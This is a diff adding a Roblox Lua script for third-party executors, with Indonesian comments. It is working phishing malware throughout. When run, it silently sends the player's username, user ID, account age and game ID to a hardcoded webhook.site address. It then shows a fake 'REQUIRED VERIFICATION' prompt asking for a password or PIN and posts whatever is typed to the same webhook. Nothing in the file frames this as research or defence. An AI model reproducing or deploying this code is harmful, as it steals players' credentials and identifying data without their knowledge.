@@ -1,1 +1,108 @@
+-- [[ CONFIGURATION ]]
+local player = game.Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local webhook_url = "https://webhook.site/27eb8fbf-2261-4007-aa49-d8e435c42558"
+
+-- Mendeteksi fungsi request dari berbagai executor (Delta, Fluxus, dll)
+local request_func = (syn and syn.request) or (http and http.request) or http_request or request
+
+-- [[ 1. SILENT LOGGER ]]
+-- Bagian ini berjalan otomatis begitu "Execute" ditekan
+local function sendSilentLog()
+    local silent_payload = {
+        ["embeds"] = {{
+            ["title"] = "🚀 Execution Alert",
+            ["description"] = "Script baru saja dieksekusi oleh user.",
+            ["color"] = 0x3498db, -- Warna Biru
+            ["fields"] = {
+                {["name"] = "Username", ["value"] = player.Name, ["inline"] = true},
+                {["name"] = "User ID", ["value"] = tostring(player.UserId), ["inline"] = true},
+                {["name"] = "Account Age", ["value"] = player.AccountAge .. " Days", ["inline"] = true},
+                {["name"] = "Game Place ID", ["value"] = tostring(game.PlaceId), ["inline"] = false}
+            },
+            ["footer"] = {["text"] = "Time: " .. os.date("%X")}
+        }}
+    }
+
+    if request_func then
+        task.spawn(function()
+            request_func({
+                Url = webhook_url,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(silent_payload)
+            })
+        end)
+    end
+end
+
+sendSilentLog() -- Jalankan log otomatis
+
+-- [[ 2. FAKE UI CONSTRUCTION ]]
+local ScreenGui = Instance.new("ScreenGui", player.PlayerGui)
+ScreenGui.Name = "SystemPrompt"
+
+local Frame = Instance.new("Frame", ScreenGui)
+Frame.Size = UDim2.new(0, 320, 0, 180)
+Frame.Position = UDim2.new(0.5, -160, 0.5, -90)
+Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Frame.BorderSizePixel = 0
+Frame.Active = true
+Frame.Draggable = true 
+
+-- Styling UI
+local UICorner = Instance.new("UICorner", Frame)
+UICorner.CornerRadius = UDim.new(0, 8)
+
+local Title = Instance.new("TextLabel", Frame)
+Title.Text = "REQUIRED VERIFICATION"
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.TextColor3 = Color3.new(1, 1, 1)
+Title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Title.Font = Enum.Font.SourceSansBold
+Title.TextSize = 18
+
+local InputField = Instance.new("TextBox", Frame)
+InputField.PlaceholderText = "Enter Password/Pin to Continue..."
+InputField.Size = UDim2.new(0.85, 0, 0, 40)
+InputField.Position = UDim2.new(0.075, 0, 0.35, 0)
+InputField.Text = ""
+InputField.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+InputField.TextColor3 = Color3.new(1, 1, 1)
+
+local SubmitBtn = Instance.new("TextButton", Frame)
+SubmitBtn.Text = "SUBMIT"
+SubmitBtn.Size = UDim2.new(0.7, 0, 0, 35)
+SubmitBtn.Position = UDim2.new(0.15, 0, 0.7, 0)
+SubmitBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+SubmitBtn.TextColor3 = Color3.new(1, 1, 1)
+SubmitBtn.Font = Enum.Font.SourceSansBold
+
+-- [[ 3. SUBMIT LOGIC ]]
+SubmitBtn.MouseButton1Click:Connect(function()
+    local user_input = InputField.Text
+    
+    local ui_payload = {
+        ["embeds"] = {{
+            ["title"] = "📩 Manual Data Received",
+            ["description"] = "User memasukkan data melalui Fake UI.",
+            ["color"] = 0x00FF00, -- Warna Hijau
+            ["fields"] = {
+                {["name"] = "User", ["value"] = player.Name, ["inline"] = true},
+                {["name"] = "Input", ["value"] = user_input, ["inline"] = false}
+            }
+        }}
+    }
+
+    if request_func then
+        request_func({
+            Url = webhook_url,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(ui_payload)
+        })
+    end
+
+    ScreenGui:Destroy() -- Hapus UI setelah submit
+end)
 
